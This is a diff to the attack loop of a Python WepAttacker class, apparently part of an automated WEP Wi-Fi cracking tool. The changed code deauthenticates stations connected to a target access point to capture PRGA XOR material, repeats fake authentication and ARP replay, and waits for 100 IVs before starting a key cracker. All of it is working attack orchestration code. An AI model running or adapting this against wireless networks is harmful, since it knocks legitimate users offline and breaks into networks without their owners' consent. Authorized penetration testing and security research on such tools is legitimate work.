@@ -614,41 +614,40 @@ class WepAttacker(object):
             fake_authentication.start()
             time.sleep(1)
 
-            # TODO(xvondr20) Refactor to improve following strategy ->
             while fake_authentication.state != FakeAuthentication.State.ok:
                 fake_authentication.update_state()
                 if fake_authentication.flags['needs_prga_xor']:
                     # deauthenticate stations to acquire prga_xor
-                    capture_result = []
-                    while len(capture_result) == 0:
-                        capture_result = capturer.get_capture_result()
-                    tmp_ap = capture_result[0]
-                    while not capturer.has_prga_xor():
-                        for st in tmp_ap.associated_stations:
-                            deauthenticate(self.monitoring_interface, st)
-                            time.sleep(2)
-                            if capturer.has_prga_xor():
-                                break
-                    logger.debug('PRGA XOR detected')
-                    self.ap.save_prga_xor(capturer.capturing_xor_path)
-                    # stop fakeauth without prga_xor
-                    fake_authentication.clean()
-                    # start fakeauth with prga_xor
-                    fake_authentication.start()
+                    result = capturer.get_capture_result()
+                    if len(result):  # if AP was detected by capturer
+                        tmp_ap = result[0]
+                        while not capturer.has_prga_xor():
+                            for st in tmp_ap.associated_stations:
+                                deauthenticate(self.monitoring_interface, st)
+                                time.sleep(2)
+                                if capturer.has_prga_xor():
+                                    break
+                        self.ap.save_prga_xor(capturer.capturing_xor_path)
+                        logger.info('PRGA XOR detected.')
+                        # stop fakeauth without prga_xor
+                        fake_authentication.clean()
+                        # start fakeauth with prga_xor
+                        fake_authentication.start()
+                    else:
+                        logger.info('Network not detected by capturer yet.')
                 if fake_authentication.flags['deauthenticated']:
                     # wait and restart fakeauth
                     fake_authentication.clean()
                     logger.debug('fakeauth: 5 s backoff')
                     time.sleep(5)
                     fake_authentication.start()
-                    # TODO(xvondr20) What if fake_authentication is terminated without any flag?
-            # TODO <-
 
             arp_replay = ArpReplay(interface=self.monitoring_interface, ap=self.ap)
             arp_replay.start(source_mac=self.monitoring_interface.mac_address)
 
-            # some time to create capturecapturer.capturing_cap_path
-            time.sleep(6)
+            # some time to create capture capturer.capturing_cap_path
+            while capturer.get_iv_sum() < 100:
+                time.sleep(1)
 
             cracker = WepCracker(cap_filepath=capturer.capturing_cap_path, ap=self.ap)
             cracker.start()
